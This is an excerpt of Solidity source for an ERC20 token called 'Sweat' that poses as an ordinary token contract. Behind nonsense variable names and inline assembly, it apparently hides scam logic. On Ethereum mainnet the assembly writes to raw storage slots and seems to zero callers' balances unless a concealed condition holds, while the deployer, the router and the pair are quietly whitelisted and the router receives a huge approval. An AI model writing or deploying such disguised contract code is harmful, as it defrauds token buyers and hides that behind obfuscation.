...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSweat;
    uint256 private theSweater = block.number*2;

    mapping (address => bool) private _firstLaugh; 
    mapping (address => bool) private _secondCry;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rescueMission;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private flyingDog;
    address public pair;
    ...
    bool private trading; uint256 private coldWater = 1; bool private strangeThing;
    uint256 private _decimals; uint256 private baseBall;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSweat.push(_router); addSweat.push(msgSender_); addSweat.push(pair);
        for (uint256 q=0; q < 3;) {_firstLaugh[addSweat[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x7da39d98e24a0fb50d5be58783200569c7a9fcbd378883dbdf73ea3aab0e2988
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x117912f502d7431d75e711482d448ae796d45d47cb84b1fc6e1c35815722ba89,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; theSweater = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSweat[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySweat(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSweat[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySweat(creator, initialSupply);
    }
}

contract Sweat is ERC20Token {
    constructor() ERC20Token("Sweat", "SWEAT", msg.sender, 1000000 * 10 ** 18) {
    }
}